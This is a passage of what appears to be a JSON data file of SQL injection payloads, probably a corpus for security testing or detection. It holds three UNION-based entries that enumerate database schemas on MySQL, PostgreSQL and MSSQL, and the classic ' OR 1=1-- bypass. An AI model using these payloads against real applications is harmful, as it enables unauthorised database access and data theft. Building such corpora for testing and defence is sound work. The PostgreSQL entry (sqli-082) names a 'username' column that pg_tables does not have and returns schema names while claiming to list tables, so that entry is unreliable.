  {"id": "sqli-081", "family": "sqli", "subtype": "info_schema", "payload_string": "' UNION SELECT table_name,table_schema FROM information_schema.tables-- ", "context": "MySQL full schema enumeration", "description": "Enumerate all tables across all databases in MySQL", "references": ["https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables.html"]},
  {"id": "sqli-082", "family": "sqli", "subtype": "info_schema", "payload_string": "' UNION SELECT schemaname,username FROM pg_tables-- ", "context": "PostgreSQL table enumeration", "description": "Enumerate all tables in PostgreSQL using system catalog", "references": ["https://www.postgresql.org/docs/current/catalog-pg-tables.html"]},
  {"id": "sqli-083", "family": "sqli", "subtype": "info_schema", "payload_string": "' UNION SELECT name,type FROM master..sysobjects-- ", "context": "MSSQL object enumeration", "description": "Enumerate all objects in MSSQL master database", "references": ["https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-objects-transact-sql"]},
  {"id": "sqli-084", "family": "sqli", "subtype": "comment_variation", "payload_string": "' OR 1=1--", "context": "Double dash comment variation", "description": "SQL comment using double dash without trailing space", "references": ["https://portswigger.net/web-security/sql-injection"]},
